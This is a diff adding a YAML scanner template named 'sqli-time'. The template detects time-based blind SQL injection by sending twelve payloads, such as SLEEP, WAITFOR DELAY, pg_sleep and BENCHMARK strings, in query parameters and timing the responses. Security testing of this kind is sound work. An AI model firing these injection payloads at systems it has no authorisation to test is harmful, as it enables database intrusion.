@@ -1,0 +1,31 @@
+id: sqli-time
+info:
+  name: "SQL Injection - Time Based Blind"
+  severity: high
+  description: "Detects blind SQL injection by measuring response delays with sleep functions"
+  tags: [sqli, injection, database, blind]
+  author: Wired
+
+inject: query_params
+detection: time
+
+payloads: []
+
+time_payloads:
+  delay_seconds: 3
+  payloads:
+    - "1 AND SLEEP(3)--"
+    - "1' AND SLEEP(3)--"
+    - "1\" AND SLEEP(3)--"
+    - "1') AND SLEEP(3)--"
+    - "1'; WAITFOR DELAY '0:0:3'--"
+    - "1\"; WAITFOR DELAY '0:0:3'--"
+    - "1' AND pg_sleep(3)--"
+    - "1\" AND pg_sleep(3)--"
+    - "1' AND BENCHMARK(5000000,SHA1('test'))--"
+    - "1' OR SLEEP(3)#"
+    - "1' AND (SELECT SLEEP(3))--"
+    - "1 AND 1=(SELECT 1 FROM pg_sleep(3))"
+
+matchers:
+  body_patterns: []
